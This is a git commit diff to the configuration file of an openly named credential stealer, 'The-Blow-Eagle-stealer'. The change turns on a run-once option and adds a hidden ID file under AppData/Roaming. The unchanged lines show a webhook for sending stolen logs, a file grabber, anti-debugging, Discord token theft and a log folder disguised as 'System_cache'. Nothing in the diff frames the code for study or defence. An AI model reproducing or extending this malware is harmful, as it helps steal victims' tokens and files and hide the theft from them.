e96c755c1823406f5933b1926b93205f6ede0558
Nick Vinesmoke <123866627+Nick-Vinesmoke@users.noreply.github.com>
2023-06-26 18:14:37 +0300

    one start 1

--- The-Blow-Eagle-stealer/config/config.cpp
+++ The-Blow-Eagle-stealer/config/config.cpp
@@ -28,9 +28,11 @@
 namespace config {
 	const std::string Bot_url = ""; // url of your WebHook
 	const bool enableFileGrubber = false; // enable file grabber
-	const bool oneStart = false; // enable this if you want logs to come only from unique computers
+	const bool oneStart = true; // enable this if you want logs to come only from unique computers
 	const bool debuging = false; // disable AntiDebug (do not change if you do not know what it is responsible for)
 	const bool dsTokenGrab = false; // garb tokens from discord (increase the duration of the program about 10 mins)
 	const std::string path = "/AppData/Local/System_cache"; // path to logs
-	const char yourStealerId[10] = "Vinesmoke";//id that is used to avoid restarting on a computer from which logs have already been taken
+	const char yourStealerId[10] = "Vinesmoke"; //id that is used to avoid restarting on a computer from which logs have already been take, use for zip to
+	const std::string pathId = "/AppData/Roaming/Windows"; // path to txt where will be id, no more than one additional folder after Roaming
+	const std::string nameId = "view_log.txt"; // name of txt where will be id
 }
